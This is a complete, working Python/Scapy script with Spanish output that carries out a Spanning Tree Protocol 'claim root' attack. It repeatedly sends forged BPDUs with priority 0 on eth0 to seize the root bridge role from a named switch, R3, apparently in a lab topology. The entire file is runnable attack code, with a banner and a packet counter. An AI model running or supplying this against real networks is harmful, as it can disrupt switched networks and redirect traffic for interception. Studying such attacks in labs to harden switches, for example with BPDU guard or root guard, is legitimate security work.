#!/usr/bin/env python3
import sys, signal, time
from scapy.all import Ether, LLC, STP, sendp, get_if_hwaddr, conf

RED    = "\033[91m"
GREEN  = "\033[92m"
YELLOW = "\033[93m"
RESET  = "\033[0m"
BOLD   = "\033[1m"

IFACE    = "eth0"
STP_MAC  = "01:80:c2:00:00:00"
stats    = {"sent": 0, "start": None}
conf.verb = 0

def signal_handler(sig, frame):
    elapsed = time.time() - stats["start"]
    print(f"\n{YELLOW}[!] Ataque detenido.{RESET}")
    print(f"{GREEN}[+] BPDUs enviados: {stats['sent']} en {elapsed:.2f}s{RESET}")
    sys.exit(0)

def build_bpdu(our_mac):
    return (
        Ether(src=our_mac, dst=STP_MAC)
        / LLC(dsap=0x42, ssap=0x42, ctrl=0x03)
        / STP(proto=0, version=0, bpdutype=0x00, bpduflags=0x01,
              rootid=0, rootmac=our_mac, pathcost=0,
              bridgeid=0, bridgemac=our_mac, portid=0x8001,
              age=0, maxage=20, hellotime=2, fwddelay=15)
    )

def main():
    signal.signal(signal.SIGINT, signal_handler)
    our_mac = get_if_hwaddr(IFACE)
    print(f"""
{RED}{BOLD}
╔══════════════════════════════════════════════════╗
║       STP CLAIM ROOT ATTACK - Scapy              ║
║  Root actual : R3 prioridad 32778                ║
║  Nuestra MAC : {our_mac}     ║
║  Prioridad   : 0 (mejor que R3)                  ║
╚══════════════════════════════════════════════════╝
{RESET}
{YELLOW}[!] Enviando BPDUs maliciosos... Ctrl+C para detener{RESET}
""")
    stats["start"] = time.time()
    pkt = build_bpdu(our_mac)
    while True:
        sendp(pkt, iface=IFACE, verbose=False)
        stats["sent"] += 1
        if stats["sent"] % 10 == 0:
            elapsed = time.time() - stats["start"]
            print(f"\r{RED}[*] BPDUs enviados: {stats['sent']} | {elapsed:.0f}s{RESET}", end="", flush=True)
        time.sleep(2)

if __name__ == "__main__":
    main()
